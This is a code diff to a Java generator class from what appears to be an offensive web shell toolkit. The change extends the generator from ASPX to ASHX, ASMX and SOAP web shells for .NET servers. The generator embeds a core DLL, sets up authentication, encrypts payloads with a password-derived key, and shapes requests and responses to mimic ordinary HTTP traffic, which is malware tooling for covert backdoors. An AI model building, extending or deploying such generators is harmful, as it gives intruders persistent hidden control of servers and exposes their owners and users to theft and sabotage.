@@ -12,8 +12,8 @@ import java.nio.charset.StandardCharsets;
 import java.util.*;
 
 /**
- * Generates ASPX web shells (.NET Standard 2.0) by filling stub methods in the template
- * with implementations derived from the Profile configuration.
+ * Generates ASPX, ASHX, ASMX, and SOAP web shells (.NET Standard 2.0)
+ * by filling template placeholders with implementations derived from the Profile configuration.
  * <p>
  * This is the .NET counterpart of {@link NoOneWebShellGenerator}, which handles JSP/JSPX.
  *
@@ -22,7 +22,27 @@ import java.util.*;
 public class NoOneDotNetWebShellGenerator {
 
     private static final String ASPX_TEMPLATE_PATH = "/templates/dotnet/vul-dotnet-server.aspx";
+    private static final String ASHX_TEMPLATE_PATH = "/templates/dotnet/vul-dotnet-server.ashx";
+    private static final String ASMX_TEMPLATE_PATH = "/templates/dotnet/vul-dotnet-server.asmx";
+    private static final String SOAP_TEMPLATE_PATH = "/templates/dotnet/vul-dotnet-server.soap";
     private static final String CORE_DLL_PATH = "/dotnet-core.dll";
+
+    private static final String PLACEHOLDER_CORE_DLL_BASE64 = "__CORE_DLL_BASE64__";
+    private static final String PLACEHOLDER_IS_AUTHED = "__IS_AUTHED__";
+    private static final String PLACEHOLDER_GET_ARG_FROM_CONTENT = "__GET_ARG_FROM_CONTENT__";
+    private static final String PLACEHOLDER_TRANSFORM_REQ_PAYLOAD = "__TRANSFORM_REQ_PAYLOAD__";
+    private static final String PLACEHOLDER_TRANSFORM_RES_DATA = "__TRANSFORM_RES_DATA__";
+    private static final String PLACEHOLDER_WRAP_RES_DATA = "__WRAP_RES_DATA__";
+    private static final String PLACEHOLDER_WRAP_RESPONSE = "__WRAP_RESPONSE__";
+    private static final String PLACEHOLDER_EXTRA_IMPORTS = "__EXTRA_IMPORTS__";
+    private static final String PLACEHOLDER_EXTRA_HELPERS = "__EXTRA_HELPERS__";
+
+    private static final String DEFAULT_IS_AUTHED_METHOD = "    private bool IsAuthed()\n    {\n        return true;\n    }";
+    private static final String DEFAULT_GET_ARG_FROM_CONTENT_METHOD = "    private byte[] GetArgFromContent(byte[] content)\n    {\n        return content;\n    }";
+    private static final String DEFAULT_TRANSFORM_REQ_PAYLOAD_METHOD = "    private byte[] TransformReqPayload(byte[] payload)\n    {\n        return payload;\n    }";
+    private static final String DEFAULT_TRANSFORM_RES_DATA_METHOD = "    private byte[] TransformResData(byte[] input)\n    {\n        return input;\n    }";
+    private static final String DEFAULT_WRAP_RES_DATA_METHOD = "    private byte[] WrapResData(byte[] data)\n    {\n        return data;\n    }";
+    private static final String DEFAULT_WRAP_RESPONSE_METHOD = "    private void WrapResponse()\n    {\n    }";
 
     private final NoOneConfig config;
 
@@ -31,100 +51,72 @@ public class NoOneDotNetWebShellGenerator {
     }
 
     public String generateAspx() {
-        String template = loadTemplate(ASPX_TEMPLATE_PATH);
-        String filled = fillStubMethods(template);
-        return insertExtras(filled);
+        return fillTemplate(loadTemplate(ASPX_TEMPLATE_PATH));
+    }
+
+    public String generateAshx() {
+        return fillTemplate(loadTemplate(ASHX_TEMPLATE_PATH));
+    }
+
+    public String generateAsmx() {
+        return fillTemplate(loadTemplate(ASMX_TEMPLATE_PATH));
+    }
+
+    public String generateSoap() {
+        return fillTemplate(loadTemplate(SOAP_TEMPLATE_PATH));
     }
 
     // ==================== Template filling ====================
 
-    private String fillStubMethods(String template) {
-        String result = template;
-
-        result = result.replace(
-                "CoreDllBase64 = @\"\n\"",
-                "CoreDllBase64 = @\"\n" + generateCoreDllBase64() + "\n\""
-        );
+    private String fillTemplate(String template) {
+        String isAuthed = DEFAULT_IS_AUTHED_METHOD;
+        String getArgFromContent = DEFAULT_GET_ARG_FROM_CONTENT_METHOD;
+        String transformReqPayload = DEFAULT_TRANSFORM_REQ_PAYLOAD_METHOD;
+        String transformResData = DEFAULT_TRANSFORM_RES_DATA_METHOD;
+        String wrapResData = DEFAULT_WRAP_RES_DATA_METHOD;
+        String wrapResponse = DEFAULT_WRAP_RESPONSE_METHOD;
+        String importBlock = "";
+        String helperBlock = "";
 
         Profile profile = config.getProfile();
-        if (profile == null) {
-            return result;
+        if (profile != null) {
+            isAuthed = generateIsAuthed(profile.getIdentifier());
+
+            ProtocolConfig protocolConfig = profile.getProtocolConfig();
+            if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
+                getArgFromContent = generateGetArgFromContent(httpConfig.getRequestBodyType(), httpConfig.getRequestTemplate());
+                wrapResData = generateWrapResData(httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate());
+                wrapResponse = generateWrapResponse(httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders());
+            }
+
+            TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
+            TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());
+
+            if (!isNone(reqSpec)) {
+                String keyBase64 = computeKeyBase64(profile.getPassword(), reqSpec.encryption());
+                transformReqPayload = generateTransformMethod("TransformReqPayload", "payload", TransformDirection.INBOUND, reqSpec, keyBase64);
+            }
+
+            if (!isNone(resSpec)) {
+                String keyBase64 = computeKeyBase64(profile.getPassword(), resSpec.encryption());
+                transformResData = generateTransformMethod("TransformResData", "input", TransformDirection.OUTBOUND, resSpec, keyBase64);
+            }
+
+            Set<String> needed = collectNeededHelpers(reqSpec, resSpec);
+            importBlock = formatExtraImports(collectExtraImports(needed));
+            helperBlock = buildHelperMethodBlock(needed);
         }
 
-        result = result.replace(
-                "    private bool IsAuthed()\n    {\n        return true;\n    }",
-                generateIsAuthed(profile.getIdentifier())
-        );
-
-        ProtocolConfig protocolConfig = profile.getProtocolConfig();
-        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
-            result = result.replace(
-                    "    private byte[] GetArgFromContent(byte[] content)\n    {\n        return content;\n    }",
-                    generateGetArgFromContent(httpConfig.getRequestBodyType(), httpConfig.getRequestTemplate())
-            );
-            result = result.replace(
-                    "    private byte[] WrapResData(byte[] data)\n    {\n        return data;\n    }",
-                    generateWrapResData(httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate())
-            );
-            result = result.replace(
-                    "    private void WrapResponse()\n    {\n    }",
-                    generateWrapResponse(httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders())
-            );
-        }
-
-        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
-        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());
-
-        if (!isNone(reqSpec)) {
-            String keyBase64 = computeKeyBase64(profile.getPassword(), reqSpec.encryption());
-            result = result.replace(
-                    "    private byte[] TransformReqPayload(byte[] payload)\n    {\n        return payload;\n    }",
-                    generateTransformMethod("TransformReqPayload", "payload", TransformDirection.INBOUND, reqSpec, keyBase64)
-            );
-        }
-
-        if (!isNone(resSpec)) {
-            String keyBase64 = computeKeyBase64(profile.getPassword(), resSpec.encryption());
-            result = result.replace(
-                    "    private byte[] TransformResData(byte[] input)\n    {\n        return input;\n    }",
-                    generateTransformMethod("TransformResData", "input", TransformDirection.OUTBOUND, resSpec, keyBase64)
-            );
-        }
-
-        return result;
-    }
-
-    private String insertExtras(String content) {
-        Profile profile = config.getProfile();
-        if (profile == null) {
-            return content;
-        }
-
-        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
-        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());
-
-        Set<String> needed = collectNeededHelpers(reqSpec, resSpec);
-        if (needed.isEmpty()) {
-            return content;
-        }
-
-        String importBlock = formatExtraImports(collectExtraImports(needed));
-        String helperBlock = buildHelperMethodBlock(needed);
-
-        String result = content;
-        if (!importBlock.isEmpty()) {
-            result = result.replace(
-                    "<%@ Import Namespace=\"System.Text\" %>",
-                    "<%@ Import Namespace=\"System.Text\" %>\n" + importBlock
-            );
-        }
-        if (!helperBlock.isEmpty()) {
-            result = result.replace(
-                    "\n</script>",
-                    "\n\n" + helperBlock + "\n</script>"
-            );
-        }
-        return result;
+        return template
+                .replace(PLACEHOLDER_CORE_DLL_BASE64, generateCoreDllBase64())
+                .replace(PLACEHOLDER_IS_AUTHED, isAuthed)
+                .replace(PLACEHOLDER_GET_ARG_FROM_CONTENT, getArgFromContent)
+                .replace(PLACEHOLDER_TRANSFORM_REQ_PAYLOAD, transformReqPayload)
+                .replace(PLACEHOLDER_TRANSFORM_RES_DATA, transformResData)
+                .replace(PLACEHOLDER_WRAP_RES_DATA, wrapResData)
+                .replace(PLACEHOLDER_WRAP_RESPONSE, wrapResponse)
+                .replace(PLACEHOLDER_EXTRA_IMPORTS, importBlock)
+                .replace(PLACEHOLDER_EXTRA_HELPERS, helperBlock);
     }
 
     // ==================== Core DLL generation ====================
